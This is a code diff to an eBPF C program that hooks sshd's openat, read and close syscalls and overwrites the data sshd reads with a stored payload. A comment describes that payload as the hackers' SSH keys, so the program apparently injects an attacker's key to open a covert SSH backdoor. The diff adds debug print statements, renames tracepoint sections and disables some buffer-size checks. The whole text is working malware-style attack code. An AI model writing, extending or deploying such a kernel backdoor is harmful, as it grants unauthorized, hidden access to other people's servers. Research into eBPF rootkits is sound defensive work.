@@ -3,12 +3,6 @@
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_tracing.h>
 
-// __EXPORTED_STRUCT is alias of unused attribute.
-#define __EXPORTED_STRUCT __attribute__((unused))
-
-#define __EXPORTED_DEFINE(exported_struct_name, useless_identifier) \
-    const struct exported_struct_name *useless_identifier __EXPORTED_STRUCT
-
 #define max_payload_len 450
 #define TASK_COMM_LEN 16
 
@@ -51,7 +45,7 @@ struct custom_payload
     u8 raw_buf[max_payload_len];
     u32 payload_len;
 };
-__EXPORTED_DEFINE(custom_payload, unused2);
+
 // Map to hold the hackers key ssh keys.
 struct
 {
@@ -120,6 +114,7 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
     }
 
     // Add pid_tgid to map for our sys_exit call
+    bpf_printk("Add pid_tgid %d to map for sys_exit call", pid_tgid);
     unsigned int zero = 0;
     bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);
 
@@ -134,17 +129,19 @@ int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
     unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
     if (check == 0)
     {
+        // bpf_printk("1");
         return 0;
     }
 
     // Set the map value to be the returned file descriptor
     unsigned int fd = (unsigned int)ctx->ret;
+    bpf_printk("Add sshd fd: %d to map for read_exit call", fd);
     bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);
 
     return 0;
 }
 
-SEC("tp/syscalls/sys_enter_read")
+SEC("tracepoint/syscalls/sys_enter_read")
 int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
 {
     // Check this open call is opening our target file
@@ -158,6 +155,7 @@ int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
     // Check this is the sshd file descriptor
     unsigned int map_fd = *pfd;
     unsigned int fd = (unsigned int)ctx->args[0];
+    bpf_printk("map_fd: %d and fd: %d", map_fd, fd);
     if (map_fd != fd) {
         return 0;
     }
@@ -168,15 +166,16 @@ int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
     struct syscall_read_logging data;
     data.buffer_addr = buff_addr;
     data.calling_size = buff_size;
+
+    bpf_printk("Target buff_addr: %x", data.buffer_addr);
     bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &data, BPF_ANY);
 
     return 0;
 }
 
-SEC("tp/syscalls/sys_exit_read")
+SEC("tracepoint/syscalls/sys_exit_read")
 int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
 {
-    bpf_printk("The read Exit Called\n");
     size_t pid_tgid = bpf_get_current_pid_tgid();
     // int pid = pid_tgid >> 32;
 
@@ -187,25 +186,29 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     {
         return 0;
     }
+    
     long unsigned int buff_addr = data->buffer_addr;
     if (buff_addr <= 0)
     {
         return 0;
     }
 
+    bpf_printk("Get target buff_addr: %x", data->buffer_addr);
+    bpf_printk("Get data size: %d", data->calling_size);
     // This is amount of data returned from the read syscall
-    if (ctx->ret <= 0)
-    {
-        return 0;
-    }
+    // if (ctx->ret <= 0)
+    // {
+    //     bpf_printk("%d", ctx->ret);
+    //     return 0;
+    // }
     long int read_size = ctx->ret;
 
     // read_size less than payload, we can't write in the buffer
     // read_size == data->calling_size true means read max when sshd want read. 
     // Also means this is not the file's end.
-    if (read_size < max_payload_len || read_size == data->calling_size ) {
-        return 0;
-    }
+    // if (read_size < max_payload_len || read_size == data->calling_size ) {
+    //     return 0;
+    // }
     // |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
     // |<--------- raw content ------->|<-------------- payload -------------->|
     // |<----------------------------- ret_size ------------------------------>|
@@ -228,7 +231,9 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
         return 0;
     }
 
-    long unsigned int new_buff_addr = buff_addr + read_size - max_payload_len;
+    bpf_printk("Custom payload: %s, len: %d", payload->raw_buf, payload->payload_len);
+
+    long unsigned int new_buff_addr = buff_addr;
     //      |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
     //      |<--------- raw content ------->|<-------------- payload -------------->|
     //      |<----------------------------- ret_size ------------------------------>|
@@ -246,7 +251,7 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     return 0;
 }
 
-SEC("tp/syscalls/sys_exit_close")
+SEC("tracepoint/syscalls/sys_exit_close")
 int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
 {
     // Check if we're a process thread of interest
